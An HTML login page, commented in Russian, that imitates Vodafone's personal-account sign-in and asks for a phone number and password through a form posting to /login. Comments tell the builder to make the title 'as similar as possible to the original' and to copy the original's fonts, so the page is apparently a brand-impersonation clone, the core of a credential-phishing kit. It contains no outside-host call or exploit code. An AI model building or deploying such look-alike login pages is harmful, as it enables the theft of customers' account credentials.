<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vodafone | Вход в личный кабинет</title> <!-- Заголовок должен быть максимально похож на оригинал -->
    <link rel="stylesheet" href="style.css">
    <!-- Подключение шрифта Roboto из Google Fonts (если он используется в оригинале) -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
</head>
<body>

    <!-- Шапка сайта -->
    <header class="site-header">
        <div class="container header-content">
            <div class="logo">
                <h1>Vodafone</h1> <!-- Имя оператора -->
            </div>
            <nav>
                <a href="#" class="active">Главная</a>
                <a href="#">Тарифы</a>
                <a href="#">Мой номер</a>
                <a href="#">Поддержка</a>
                <a href="#">Войти</a> <!-- Кнопка в шапке -->
            </nav>
        </div>
    </header>

    <!-- Основное содержимое -->
    <main class="site-main">
        <div class="container">
            <div class="form-card">
                <h2>Добро пожаловать!</h2> <!-- Приветственное сообщение -->
                <p class="subtitle">Войдите в свой личный кабинет Vodafone, чтобы проверить баланс или управлять услугами.</p>

                <!-- Форма для ввода данных -->
                <form action="/login" method="POST"> <!-- Действие должно указывать на конечную точку аутентификации -->
                    
                    <!-- Поле для номера телефона (или логина) -->
                    <div class="input-group">
                        <label for="phone">Номер телефона</label>
                        <input type="tel" id="phone" name="phone" placeholder="+7 9ХХ ХХХ-ХХ-ХХ" required>
                    </div>

                    <!-- Поле для пароля -->
                    <div class="input-group">
                        <label for="password">Пароль</label>
                        <input type="password" id="password" name="password" placeholder="Введите ваш пароль" required>
                    </div>

                    <!-- Кнопка входа -->
                    <button type="submit" class="btn-login">Войти</button>
                </form>

                <!-- Ссылки под формой -->
                <div class="form-links">
                    <a href="/forgot-password">Забыли пароль?</a>
                    <span>|</span>
                    <a href="/register">Регистрация</a>
                </div>
            </div>
        </div>
    </main>

    <!-- Подвал сайта -->
    <footer class="site-footer">
        <div class="container footer-content">
            <p>&copy; 2026 Vodafone. Все права защищены.</p>
            <div class="footer-links">
                <a href="#">О компании</a>
                <a href="#">Карта сайта</a>
                <a href="#">Политика конфиденциальности</a>
                <a href="#">Контакты</a>
            </div>
        </div>
    </footer>

</body>
</html>
